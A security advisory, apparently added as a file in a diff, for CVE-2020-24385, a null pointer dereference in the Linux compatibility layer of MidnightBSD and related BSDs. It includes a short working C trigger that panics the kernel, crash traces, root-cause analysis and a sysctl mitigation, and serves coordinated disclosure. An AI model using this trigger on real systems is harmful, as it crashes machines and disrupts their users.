@@ -1,0 +1,206 @@
+Null Pointer Dereference Vulnerability in MidnightBSD
+CVE-2020-24385
+
+
+INTRODUCTION
+
+A null pointer dereference vulnerability was found in the latest version of 
+MidnightBSD (also demonstrated to affect previous versions and to potentially
+affect other *BSDs).  The vulnerability happens in the Linux compatibility 
+subsystem.
+
+This does affect MidnightBSD 1.3-CURRENT and 1.2.x releases. 
+
+CVSSv3 Scoring System
+
+The CVSS score is: 7.4
+
+We have used the following values to calculate the scores:
+	Base score is: AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
+
+Notice that since by default MidnightBSD is not affected, we've considered the
+Attack Complexity high (changes have to be made to the system configuration
+that are beyond the attacker's control).
+
+
+DISCLOSURE PROCESS
+
+We are sharing this advisory to the security teams of:
+	- FreeBSD
+	- NetBSD
+	- MidnightBSD
+	- DragonFlyBSD
+
+Once we hear from all those teams, we plan to update the advisory with more 
+accurate data (and potentially timelines).  At that point we also plan to notify
+the OpenBSD security team as well, as a heads-up.
+
+We kindly ask everyone to hold the patches until we hear back from all the 
+potentially affected BSDs. We intend to have the full cycle of fixes in 90 days,
+unless we receive compelling reasons.
+
+
+TRIGGERING THE PROBLEM
+
+To trigger the problem a PoC file is available in the DETAILS section.  
+
+We've tested the trigger code in FreeBSD 12.0-RELEASE and 12.1-RELEASE (both for
+AMD64).  It requires that the Linux Subsystem support is enabled in the kernel:
+	kldload linux64
+
+By checking the FreeBSD-current source tree for changes, we believe it is also 
+affected, but we did not spend additional time reproducing it.  We believe that 
+MidnightBSD and DragonFlyBSD might also be affected, even though the code logic 
+is slightly different (and will update this advisory once we hear from their 
+security teams). OpenBSD apparently has removed the  Linux Compatibility since 
+version 6.0, and we did not check if older versions were vulnerable.  We've 
+looked at the NetBSD code and it might also be vulnerable.
+
+Since the end of 2009 [1] FreeBSD has a feature to prevent unprivileged software
+from mapping address 0.  The feature is disabled by default in FreeBSD 7 and
+lower and can be used to prevent exploitation of this issue (for Local Privilege
+Escalation).  Edit /etc/sysctl.conf and add:
+	security.bsd.map_at_zero="0"
+
+
+DETAILS
+
+The trigger code is small enough that it fits in the advisory:
+
+----------------- BEGIN crash.c -----------------
+#include <stdio.h>
+#include <pthread.h>
+#include <unistd.h>
+
+pthread_t t;
+
+void *s_routine(void *arg)
+{
+	sleep(5);
+	puts("Thread dying... something went wrong if it did not crash by now\n");
+	puts("did you kdload linux64 and passed a linux binary as input?\n");
+}
+
+int main(int agrc, char **argv)
+{
+	pthread_create(&t, NULL, s_routine, NULL);
+	execve(argv[1], argv,NULL);
+
+	return 0;
+}
+----------------- END crash.c -----------------
+
+One just have to compile it with -lpthread and pass as a parameter any Linux
+binary (we've used the /bin/ls file from a Debian 10.4-amd64 netinst install).
+
+Here is the stack trace and other useful debug information for FreeBSD 12.0:
+
+$ ./crash linux-ls
+
+Fatal trap 12: page fault while in kernel mode
+cpuid = 2; apic id = 02
+fault virtual address 			= 0x20
+fault code						= supervisor read data, page not present
+instruction pointer				= 0x20:0xffffffff81c38605
+stack pointer					= 0x28:0xfffffe00005fe870
+frame pointer					= 0x28:0xfffffe00005fe8d0
+code segment					= base 0x0, limit 0xfffff, type 0x1b
+								= DPL 0, pres 1, long 1, def32 0, gran 1
+processor eflags				= interrupt enabled, resume, IOPL = 0
+current process					= 783 (crash)
+[ thread pid 783 tid 100119 ]
+Stopped at		release_futexes+0x25:		movq	0x20(%r14),%rbx
+db> bt
+Tracing pid 783 tid 100119 td 0xfffff80002e1c000
+release_futexes() at release_futexes+0x25/frame 0xfffffe00005fe8d0
+linux_thread_detach() at linux_thread_detach+0x21/frame 0xfffffe00005fe920
+thread_suspend_check() at thread_suspend_check+0x424/frame 0xfffffe00005fe970
+ast() at ast+0x3b9/frame 0xfffffe00005fe9b0
+doreti_ast() at doreti_ast+0x1f
+
+And here is the information for FreeBSD 12.1:
+
+Fatal trap 12: page fault while in kernel mode
+cpuid = 0; apic id = 00
+fault virtual address	= 0x18
+fault code		= supervisor read data, page not present
+instruction pointer	= 0x20:0xffffffff8283a682
+stack pointer	        = 0x28:0xfffffe00004c3980
+frame pointer	        = 0x28:0xfffffe00004c39e0
+code segment		= base 0x0, limit 0xfffff, type 0x1b
+			= DPL 0, pres 1, long 1, def32 0, gran 1
+processor eflags	= interrupt enabled, resume, IOPL = 0
+current process		= 868 (crash)
+trap number		= 12
+panic: page fault
+cpuid = 0
+time = 1591901793
+KDB: stack backtrace:
+#0 0xffffffff80c1d297 at kdb_backtrace+0x67
+#1 0xffffffff80bd05cd at vpanic+0x19d
+#2 0xffffffff80bd0423 at panic+0x43
+#3 0xffffffff810a7d2c at trap_fatal+0x39c
+#4 0xffffffff810a7d79 at trap_pfault+0x49
+#5 0xffffffff810a736f at trap+0x29f
+#6 0xffffffff81081a0c at calltrap+0x8
+#7 0xffffffff8282f3d1 at linux_thread_detach+0x21
+#8 0xffffffff80be5a6f at thread_suspend_check+0x41f
+#9 0xffffffff80c32e79 at ast+0x3b9
+#10 0xffffffff81084f19 at doreti_ast+0x1f
+
+
+Trying to pinpoint the error in the code, we have:
+
+sys/kern/kern_thread.c:
+thread_suspend_check() calls linux_thread_detach() which calls, one after the other:
+	em_find() 	-> that returns NULL
+	KASSERT (em != NULL) -> happens only in the non-default conf INVARIANTS
+	release_futexes() -> where the NULL de-reference happens
+	
+sys/compat/linux/linux_futex.c:
+release_futexes() 
+	in the very beginning has (without checking em):
+		head = em->robust_futexes; (EM is 0) -> NULL DEREF at offset 0x18 (24)
+
+sys/compat/linux/linux_emul.h:
+em_find() -> returns NULL (because td->td_emuldata is NULL)
+
+sys/compat/linux/linux_emul.h:
+The em type is a
+struct linux_emuldata {
+//Offset:
+0		int *
+8		int *
+16		int
+20		int
+24		struct linux_robust_list_head *robust_futexes;
+}
+
+The reason why td->td_emuldata is NULL seems to be because the value is filled at 
+loading time, but the process that is originating the call is a FreeBSD ELF 
+(not a Linux one).
+
+Notice that there are multiple other cases of KASSERT (em != NULL) that are 
+likely reacheable to an attacker as well.
+
+
+TIMELINE
+
+This timeline will be updated once we start hearing back from the different
+teams.
+
+-> Initial disclosure to
+FreeBSD/MidnightBSD/DragonFlyBSD/NetBSD -06/16/2020
+Patched in MidnightBSD 1.3-CURRENT 08/2020
+
+CREDITS
+
+This vulnerability was discovered and exploited by Paulo Henrique L. Amorim 
+(Independent Security Researcher) and Rodrigo Rubira Branco (BSDaemon)
+(Amazon Web Services).
+
+
+REFERENCES
+
+[1] FreeBSD Errata. "No zero mapping feature".
+Link:  https://www.freebsd.org/security/advisories/FreeBSD-EN-09:05.null.asc
